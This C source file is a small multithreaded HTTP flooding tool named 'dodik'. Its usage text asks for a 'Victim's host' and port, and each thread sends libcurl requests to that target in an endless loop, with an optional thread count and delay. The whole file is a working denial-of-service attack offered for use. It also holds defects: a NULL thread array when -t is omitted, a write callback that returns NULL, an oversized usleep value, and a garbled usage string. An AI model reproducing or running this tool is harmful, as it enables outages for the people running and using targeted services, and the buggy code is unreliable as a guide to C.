#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <curl/curl.h>

struct data {
	char const *host;
	char const *port;
	int timeout;
};

void *writefunction(char *buffer, size_t size, size_t nitem, void *n);

void *threadSend(void *args);

int main(int const argc, char const **argv)
{
	if (argc < 4) {
		printf("\nError: too few arguments\n");
		printf("\nUsage: dodik [opt1] [value1] [opt2] [value2] ... \n\n");
		printf("Option\tDescrhosttion\n");
		printf("  -h  \t(MUST BE) Victim's host\n");
		printf("  -p  \t(MUST BE) Victim's port\n");
		printf("  -t  \t(optional) Count threads; def.val.=1\n");
		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
		exit(EXIT_FAILURE);
	}
	
	// Declaring variables
	int count_threads = 0;
	pthread_t *thread_arr = NULL;
	struct data args = {0};
	args.host = NULL;
	args.port = NULL;
	args.timeout = 0;
	count_threads = 1;
	
	// Argument handling
	for (int i = 1; i <= argc - 1; i += 2) {
		if (strcmp(argv[i], "-h") == 0)
			args.host = argv[i + 1];
		else if (strcmp(argv[i], "-p") == 0)
			args.port = argv[i + 1];
		else if (strcmp(argv[i], "-t") == 0) {
			free(thread_arr);
			count_threads = atoi(argv[i + 1]);
			thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
		}
		else if (strcmp(argv[i], "-s") == 0)
			args.timeout = atoi(argv[i + 1]);
	}

	// Checking must haves variables
	if (args.host == NULL || args.port == NULL) {
		if (args.host == NULL)
			printf("Error: you didn't enter host-address\n");
		if (args.port == NULL)
			printf("Error: you didn't enter port\n");
		free(thread_arr);
		exit(EXIT_FAILURE);
	}

	// Creating threads
	for (int i = 0; i < count_threads; i++)
		pthread_create(thread_arr + i, NULL, threadSend, (void *) &args);

	// Launch threads
	for (int i = 0; i < count_threads; i++)
		pthread_join(thread_arr[i], NULL);
	
	free(thread_arr); // freeing allocated memory
	
	return 0;
}

void *writefunction(char *buffer, size_t size, size_t nitem, void *n)
{
	return NULL;
}

void *threadSend(void *args)
{
	char const *host = ((struct data*) args)->host;
	char const *port = ((struct data*) args)->port;
	int timeout = ((struct data*) args)->timeout;
	
	CURL *curl = NULL;
	curl = curl_easy_init();
	curl_easy_setopt(curl, CURLOPT_URL, host);
	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
	while (1) {
		curl_easy_perform(curl);
		usleep(timeout * 1000000);
	}
}
